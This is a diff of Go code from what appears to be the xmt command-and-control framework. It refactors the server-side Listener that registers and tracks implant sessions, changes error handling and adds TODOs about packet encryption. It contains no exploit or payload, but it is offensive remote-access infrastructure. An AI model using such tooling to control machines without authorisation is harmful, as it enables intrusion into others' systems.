@@ -1,3 +1,5 @@
+//go:build !implant
+
 package c2
 
 import (
@@ -11,6 +13,8 @@ import (
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 )
+
+var _ connServer = (*Listener)(nil)
 
 // Listener is a struct that is passed back when a C2 Listener is added to the
 // Server.
@@ -61,7 +65,7 @@ func (l *Listener) listen() {
 			if cout.Enabled {
 				l.log.Error("[%s] Error during Listener accept: %s!", l.name, err)
 			}
-			if ok && !e.Timeout() && !e.Temporary() {
+			if ok && !e.Timeout() {
 				break
 			}
 			continue
@@ -149,6 +153,12 @@ func (l *Listener) clientClear(i uint32) {
 	}
 	v.chn = nil
 	v.state.Unset(stateChannelProxy)
+}
+func (l *Listener) tryRemove(s *Session) {
+	if l.s == nil || l.state.WakeClosed() {
+		return
+	}
+	l.s.delSession <- s.ID.Hash()
 }
 
 // Shutdown triggers a remote Shutdown and closure of the Session associated
@@ -266,8 +276,9 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 		if l.s.lock.Unlock(); cout.Enabled {
 			l.log.Info("[%s:%s] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
 		}
+		// TODO(dij): Generate encryption key here.
 	}
-	if s.sleep == 0 && ok {
+	if s.host.Set(a); s.sleep == 0 && ok {
 		if s.parent != l {
 			s.parent = l
 		}
@@ -278,7 +289,7 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 			s.sleep = time.Since(s.Created)
 		}
 	}
-	if s.Last, s.host = time.Now(), a; !ok {
+	if s.Last = time.Now(); !ok {
 		if n.Flags&com.FlagProxy == 0 {
 			s.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
 		}
@@ -290,6 +301,8 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 	if err != nil {
 		return nil, err
 	}
+	// TODO(dij): If key is not new, decrypt packet here.
+	//            Then add key to conn struct.
 	if err = c.process(l.log, l, a, n, false); err != nil {
 		return nil, err
 	}
@@ -360,7 +373,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 			l.log.Info("[%s:%s/M] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
 		}
 	}
-	if s.sleep == 0 && ok {
+	if s.host.Set(a); s.sleep == 0 && ok {
 		if s.parent != l {
 			s.parent = l
 		}
@@ -371,7 +384,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 			s.sleep = time.Since(s.Created)
 		}
 	}
-	if s.Last, s.host = time.Now(), a; !ok {
+	if s.Last = time.Now(); !ok {
 		if n.Flags&com.FlagProxy == 0 {
 			s.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
 		}
